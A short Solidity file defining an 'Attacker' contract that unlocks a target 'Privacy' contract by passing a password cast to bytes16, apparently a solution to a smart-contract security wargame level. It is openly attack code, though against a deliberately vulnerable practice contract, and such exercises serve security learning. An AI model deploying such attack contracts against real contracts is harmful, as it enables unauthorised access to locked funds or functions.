// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Privacy.sol';

contract Attacker {

  address payable target;
  address public deployer;

  constructor (address payable _target) public payable {
    target = _target;
    deployer = msg.sender;
  }

  function attack(bytes32 password) public {
    Privacy(target).unlock(bytes16(password));
    }

}
